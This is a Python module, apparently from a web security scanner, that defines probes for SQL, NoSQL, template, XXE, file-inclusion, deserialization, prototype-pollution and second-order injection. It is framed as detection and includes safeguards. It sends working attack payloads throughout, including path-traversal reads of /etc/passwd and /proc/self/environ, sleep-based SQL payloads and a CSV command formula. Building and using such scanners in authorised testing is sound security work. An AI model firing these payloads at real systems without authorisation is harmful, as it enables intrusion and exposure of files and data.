#!/usr/bin/env python3
"""Injection primitives — SQLi (error/boolean/time), NoSQL, SSTI, XXE, LFI/RFI, deserialization."""
from __future__ import annotations

import re

from . import (Ctx, ProbeResult, TIMEOUT, blocked, median, primitive, requests, send, shape,
               sink_hits, start_sink, timed)

DB_ERRORS = [
    "sqlite3.", "you have an error in your sql syntax", "psycopg2", "pg::syntaxerror",
    "ora-0", "sqlstate", "unclosed quotation mark", "quoted string not properly terminated",
    "unterminated quoted string", "microsoft ole db provider", "odbc driver",
    "mysql_fetch", "pdoexception", "sqlalchemy.exc", "syntax error at or near",
]


def _err(text: str) -> str:
    low = (text or "").lower()
    return next((e for e in DB_ERRORS if e in low), "")


@primitive("sqli_error", default_param="q", group="B", cwe="CWE-89")
def sqli_error(base: str, endpoint: str, param: str = "q", ctx: Ctx | None = None) -> ProbeResult:
    """A lone quote surfaces a database error string."""
    ctx = ctx or Ctx()
    for payload in ("'", '"', "')", "';", "\\"):
        try:
            r = requests.get(f"{base}{endpoint}", params={param: payload}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        hit = _err(r.text)
        if hit and ctx.differs_from_baseline(r):
            return ProbeResult("sqli_error", True, endpoint, payload, r.status_code,
                               f"database error surfaced verbatim ({hit})",
                               {"marker": hit, "snippet": (r.text or "")[:400]})
    return ProbeResult("sqli_error", False, endpoint, "'", detail="no DB error surfaced")


@primitive("sqli_boolean", default_param="q", group="B", cwe="CWE-89")
def sqli_boolean(base: str, endpoint: str, param: str = "q", ctx: Ctx | None = None,
                 seed: str = "a") -> ProbeResult:
    """Three-way comparison: untampered vs AND 1=1 vs AND 1=2. Two-way is the classic false positive."""
    ctx = ctx or Ctx()
    variants = [
        (f"{seed}' AND '1'='1", f"{seed}' AND '1'='2"),
        (f"{seed}\" AND \"1\"=\"1", f"{seed}\" AND \"1\"=\"2"),
        (f"{seed}' OR '1'='1' -- ", f"{seed}' OR '1'='2' -- "),
    ]
    try:
        control = requests.get(f"{base}{endpoint}", params={param: seed}, timeout=TIMEOUT)
        control2 = requests.get(f"{base}{endpoint}", params={param: seed}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("sqli_boolean", False, endpoint, detail=str(e))
    # if the endpoint isn't even stable between two identical requests, a diff proves nothing
    if shape(control.text) != shape(control2.text):
        return blocked("sqli_boolean", endpoint,
                       "endpoint response is non-deterministic between identical requests; "
                       "a boolean differential cannot be attributed to the payload")
    base_shape = shape(control.text)

    for t_payload, f_payload in variants:
        try:
            rt = requests.get(f"{base}{endpoint}", params={param: t_payload}, timeout=TIMEOUT)
            rf = requests.get(f"{base}{endpoint}", params={param: f_payload}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        st, sf = shape(rt.text), shape(rf.text)
        # TRUE must look like the untampered control AND differ from FALSE
        if st == base_shape and sf != st:
            return ProbeResult("sqli_boolean", True, endpoint, t_payload, rt.status_code,
                               "TRUE payload matches the untampered response; FALSE differs",
                               {"control_shape": base_shape, "true_shape": st, "false_shape": sf,
                                "true_len": len(rt.text or ""), "false_len": len(rf.text or "")})
    return ProbeResult("sqli_boolean", False, endpoint, variants[0][0],
                       detail="no consistent 3-way boolean differential")


@primitive("sqli_time", default_param="q", group="B", cwe="CWE-89",
           needs="--opt allow_timing=1 (timing probes load the target)")
def sqli_time(base: str, endpoint: str, param: str = "q", ctx: Ctx | None = None) -> ProbeResult:
    """Median-of-3 timing delta with a 0-second control. Opt-in: it deliberately makes the DB wait."""
    ctx = ctx or Ctx()
    if str(ctx.opts.get("allow_timing", "")).lower() not in ("1", "true", "yes"):
        return blocked("sqli_time", endpoint,
                       "timing probe not enabled — pass --opt allow_timing=1 after confirming the "
                       "program permits it (it holds a DB connection open)")
    try:
        baseline = median([timed("GET", f"{base}{endpoint}", params={param: "a"})[1] for _ in range(3)])
    except requests.RequestException as e:
        return ProbeResult("sqli_time", False, endpoint, detail=str(e))

    for payload, control in (
        ("a' AND (SELECT 1 FROM PG_SLEEP(4))-- ", "a' AND (SELECT 1 FROM PG_SLEEP(0))-- "),
        ("a' AND SLEEP(4)-- ", "a' AND SLEEP(0)-- "),
        ("a'; WAITFOR DELAY '0:0:4'-- ", "a'; WAITFOR DELAY '0:0:0'-- "),
        ("a' AND 1=randomblob(200000000)-- ", "a' AND 1=randomblob(1)-- "),   # sqlite
    ):
        try:
            slow = median([timed("GET", f"{base}{endpoint}", params={param: payload},
                                 timeout=20)[1] for _ in range(3)])
            fast = median([timed("GET", f"{base}{endpoint}", params={param: control},
                                 timeout=20)[1] for _ in range(3)])
        except requests.RequestException:
            continue
        # the 0-second control must come back to baseline, or you measured load, not injection
        if slow >= baseline + 3.5 and fast < baseline + 1.5:
            return ProbeResult("sqli_time", True, endpoint, payload, 0,
                               f"median {slow:.1f}s vs baseline {baseline:.1f}s; "
                               f"0-second control returned to {fast:.1f}s",
                               {"baseline_s": round(baseline, 2), "delayed_s": round(slow, 2),
                                "control_s": round(fast, 2)})
    return ProbeResult("sqli_time", False, endpoint, detail="no reproducible timing delta")


@primitive("nosqli", default_param="user", group="B", cwe="CWE-943")
def nosqli(base: str, endpoint: str, param: str = "user", ctx: Ctx | None = None) -> ProbeResult:
    """An operator object where a scalar was expected returns records the scalar did not."""
    ctx = ctx or Ctx()
    url = f"{base}{endpoint}"
    try:
        scalar = requests.post(url, json={param: "definitely-not-a-user-9c2f"}, timeout=TIMEOUT)
    except requests.RequestException as e:
        return ProbeResult("nosqli", False, endpoint, detail=str(e))
    base_len = len(scalar.text or "")

    for payload in ({"$ne": None}, {"$ne": ""}, {"$gt": ""}, {"$regex": ".*"},
                    {"$where": "1"}, {"$exists": True}):
        try:
            r = requests.post(url, json={param: payload}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code < 400 and len(r.text or "") > base_len + 20 and ctx.differs_from_baseline(r):
            return ProbeResult("nosqli", True, endpoint, str(payload), r.status_code,
                               "operator object returned records the scalar query did not",
                               {"scalar_len": base_len, "operator_len": len(r.text or ""),
                                "snippet": (r.text or "")[:300]})
    # bracket syntax, for query-string parsers that build nested objects
    try:
        r = requests.get(url, params={f"{param}[$ne]": ""}, timeout=TIMEOUT)
        if r.status_code < 400 and len(r.text or "") > base_len + 20:
            return ProbeResult("nosqli", True, endpoint, f"{param}[$ne]=", r.status_code,
                               "bracket-syntax operator injection via the query string",
                               {"snippet": (r.text or "")[:300]})
    except requests.RequestException:
        pass
    return ProbeResult("nosqli", False, endpoint, detail="operator objects rejected or ignored")


@primitive("ssti", default_param="tpl", group="B", cwe="CWE-1336")
def ssti(base: str, endpoint: str, param: str = "tpl", ctx: Ctx | None = None) -> ProbeResult:
    """Dialect ladder: 49 present and the literal 7*7 absent. Records which engine answered."""
    ctx = ctx or Ctx()
    ladder = [(d, "49") for d in (ctx.dialects or
                                  ["{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>", "*{7*7}"])]
    ladder.append(("{{7*'7'}}", "7777777"))          # Jinja2/Twig fingerprint
    ladder.append(("@(7*7)", "49"))                  # Razor
    for payload, expect in ladder:
        try:
            r = requests.get(f"{base}{endpoint}", params={param: payload}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        body = r.text or ""
        # the literal payload coming back means it was reflected, not evaluated
        if expect in body and payload not in body:
            engine = {"{{7*'7'}}": "jinja2/twig", "${7*7}": "spel/freemarker/js-template",
                      "#{7*7}": "ruby/spel", "<%=7*7%>": "erb/ejs/asp", "@(7*7)": "razor"}.get(
                          payload, "unknown")
            return ProbeResult("ssti", True, endpoint, payload, r.status_code,
                               f"template expression evaluated server-side (engine hint: {engine})",
                               {"expected": expect, "engine_hint": engine,
                                "snippet": body[:300]})
    return ProbeResult("ssti", False, endpoint, ladder[0][0],
                       detail="no dialect evaluated; values reflected literally or rejected")


@primitive("xxe", group="B", cwe="CWE-611")
def xxe(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Local entity expansion, then an out-of-band entity to a listener we control."""
    ctx = ctx or Ctx()
    url = f"{base}{endpoint}"
    hdr = {"Content-Type": "application/xml"}

    # 1) purely local: no network, no file read beyond a harmless internal entity
    local = ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY probe "XXE-OK-9c2f">]>'
             '<r><title>&probe;</title></r>')
    try:
        r = requests.post(url, data=local, headers=hdr, timeout=TIMEOUT)
        if "XXE-OK-9c2f" in (r.text or ""):
            return ProbeResult("xxe", True, endpoint, "internal entity", r.status_code,
                               "XML entities are resolved by the parser",
                               {"snippet": (r.text or "")[:300]})
    except requests.RequestException:
        pass

    # 2) out-of-band, to prove the parser will also fetch
    callback, srv = start_sink()
    try:
        oob = (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{callback}">]>'
               f'<r><title>&x;</title></r>')
        try:
            requests.post(url, data=oob, headers=hdr, timeout=TIMEOUT)
        except requests.RequestException:
            pass
        import time as _t
        _t.sleep(0.6)
        hits = sink_hits()
        if hits:
            return ProbeResult("xxe", True, endpoint, "SYSTEM entity", 0,
                               "parser fetched an external entity (out-of-band confirmed)",
                               {"callbacks": hits})
    finally:
        srv.shutdown()
    return ProbeResult("xxe", False, endpoint, detail="entities not resolved")


@primitive("lfi_rfi", default_param="file", group="C", cwe="CWE-98")
def lfi_rfi(base: str, endpoint: str, param: str = "file", ctx: Ctx | None = None) -> ProbeResult:
    """Local include markers, PHP wrappers, then a remote include to our own listener."""
    ctx = ctx or Ctx()
    markers = ("root:x:", "for 16-bit app support", "[extensions]", "[boot loader]")
    payloads = ["/etc/passwd", "../../../../../../etc/passwd", r"..\..\..\..\windows\win.ini",
                "....//....//....//etc/passwd", "/proc/self/environ",
                "php://filter/convert.base64-encode/resource=index",
                "/etc/passwd%00", "file:///etc/passwd"]
    for p in payloads:
        try:
            r = requests.get(f"{base}{endpoint}", params={param: p}, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        low = (r.text or "").lower()
        if r.status_code == 200 and any(m in low for m in markers):
            return ProbeResult("lfi_rfi", True, endpoint, p, r.status_code,
                               "included a file outside the intended directory",
                               {"snippet": (r.text or "")[:300]})
        if p.startswith("php://filter") and r.status_code == 200 and re.search(
                r"^[A-Za-z0-9+/=\s]{80,}$", (r.text or "").strip()):
            return ProbeResult("lfi_rfi", True, endpoint, p, r.status_code,
                               "php:// wrapper returned base64-encoded source",
                               {"snippet": (r.text or "")[:200]})

    callback, srv = start_sink()
    try:
        try:
            requests.get(f"{base}{endpoint}", params={param: callback}, timeout=TIMEOUT)
        except requests.RequestException:
            pass
        import time as _t
        _t.sleep(0.6)
        if sink_hits():
            return ProbeResult("lfi_rfi", True, endpoint, callback, 0,
                               "remote include: the server fetched our URL as an include target",
                               {"callbacks": sink_hits()})
    finally:
        srv.shutdown()
    return ProbeResult("lfi_rfi", False, endpoint, detail="no include outside the intended dir")


@primitive("deserial_cookie", group="B", cwe="CWE-502", detection_only=True)
def deserial_cookie(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Detection only: does a serialized blob in a cookie/param reach a deserializer?

    Never sends a gadget chain. A distinctive parse error proves the sink; building a payload that
    executes on a live host is not something this pipeline does.
    """
    ctx = ctx or Ctx()
    shapes = {
        "java": "rO0ABXNyABFqYXZhLmxhbmcuSW50ZWdlcg==",
        "python-pickle": "gASVCgAAAAAAAAB9lIwBYZRLAXMu",
        "php": 'O:8:"stdClass":0:{}',
        "ruby-marshal": "BAhbBg==",
        "dotnet-viewstate": "/wEPDwUJODYxMDU5MDY3ZGQ=",
    }
    errors = {"java": ("streamcorrupted", "invalidclassexception", "java.io.objectinput"),
              "python-pickle": ("unpicklingerror", "pickle", "_pickle"),
              "php": ("unserialize", "__wakeup", "notice: undefined"),
              "ruby-marshal": ("marshal", "typeerror: instance of"),
              "dotnet-viewstate": ("viewstate", "cryptographicexception", "machinekey")}
    for lang, blob in shapes.items():
        for how in ("cookie", "param"):
            try:
                if how == "cookie":
                    r = requests.get(f"{base}{endpoint}", headers={"Cookie": f"session={blob}"},
                                     timeout=TIMEOUT)
                else:
                    r = requests.get(f"{base}{endpoint}", params={"data": blob}, timeout=TIMEOUT)
            except requests.RequestException:
                continue
            low = (r.text or "").lower()
            if any(e in low for e in errors[lang]):
                return ProbeResult("deserial_cookie", True, endpoint, f"{lang} via {how}",
                                   r.status_code,
                                   f"a {lang} serialized blob reaches a deserializer "
                                   f"(detection only — no gadget chain sent)",
                                   {"language": lang, "vector": how,
                                    "detection_only": True, "snippet": (r.text or "")[:300]})
    return ProbeResult("deserial_cookie", False, endpoint,
                       detail="no deserializer reached by a serialized blob")


@primitive("proto_pollution_server", group="B", cwe="CWE-1321")
def proto_pollution_server(base: str, endpoint: str, ctx: Ctx | None = None) -> ProbeResult:
    """Pollute via a recursive merge, then read the key back off an unrelated response."""
    ctx = ctx or Ctx()
    key = f"pp_{(ctx.marker or 'probe-9c2f').replace('-', '_')}"
    url = f"{base}{endpoint}"
    for payload in ({"__proto__": {key: "polluted"}},
                    {"constructor": {"prototype": {key: "polluted"}}}):
        try:
            r = requests.post(url, json=payload, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if r.status_code >= 400:
            continue
        if key in (r.text or "") and "polluted" in (r.text or ""):
            return ProbeResult("proto_pollution_server", True, endpoint, str(payload), r.status_code,
                               "injected prototype key is reflected in application state",
                               {"key": key, "snippet": (r.text or "")[:300]})
        # the stronger signal: the key surfaces on a DIFFERENT endpoint's fresh object
        try:
            probe = requests.get(f"{base}/", timeout=TIMEOUT)
            if key in (probe.text or ""):
                return ProbeResult("proto_pollution_server", True, endpoint, str(payload),
                                   probe.status_code,
                                   "injected key appears on an unrelated response — "
                                   "Object.prototype was polluted process-wide",
                                   {"key": key, "observed_on": "/"})
        except requests.RequestException:
            pass
    return ProbeResult("proto_pollution_server", False, endpoint,
                       detail="__proto__/constructor keys rejected or contained")


@primitive("second_order", default_param="value", group="B", cwe="CWE-79",
           needs="a read-back endpoint (--opt readback=/path)")
def second_order(base: str, endpoint: str, param: str = "value", ctx: Ctx | None = None) -> ProbeResult:
    """Store a payload shaped for a LATER parser, then read it back from the consumer."""
    ctx = ctx or Ctx()
    readback = ctx.opts.get("readback")
    if not readback:
        return blocked("second_order", endpoint,
                       "no read-back endpoint given — pass --opt readback=/path so the stored "
                       "value can be observed where it is consumed")
    marker = ctx.fresh_marker("so")      # unique per run, or a re-sweep sees its own earlier write
    payloads = {
        "html": f"<b>{marker}</b>",
        "sql": f"{marker}' OR '1'='1",
        "template": "{{7*7}}" + marker,
        "csv-formula": f"=1+1+cmd|'{marker}'",
    }
    for kind, payload in payloads.items():
        try:
            requests.post(f"{base}{endpoint}", json={param: payload}, timeout=TIMEOUT)
            r = requests.get(f"{base}{readback}", timeout=TIMEOUT)
        except requests.RequestException:
            continue
        body = r.text or ""
        if kind == "html" and f"<b>{marker}</b>" in body:
            return ProbeResult("second_order", True, endpoint, payload, r.status_code,
                               f"stored value rendered unescaped at {readback}",
                               {"sink_kind": kind, "readback": readback, "snippet": body[:300]})
        if kind == "template" and "49" in body and "{{7*7}}" not in body:
            return ProbeResult("second_order", True, endpoint, payload, r.status_code,
                               f"stored value evaluated as a template at {readback}",
                               {"sink_kind": kind, "readback": readback})
        if kind == "csv-formula" and payload in body and "csv" in (
                r.headers.get("Content-Type", "").lower()):
            return ProbeResult("second_order", True, endpoint, payload, r.status_code,
                               f"formula-leading value exported to CSV unescaped",
                               {"sink_kind": kind, "readback": readback})
    return ProbeResult("second_order", False, endpoint,
                       detail=f"stored values neutralized at {readback}")
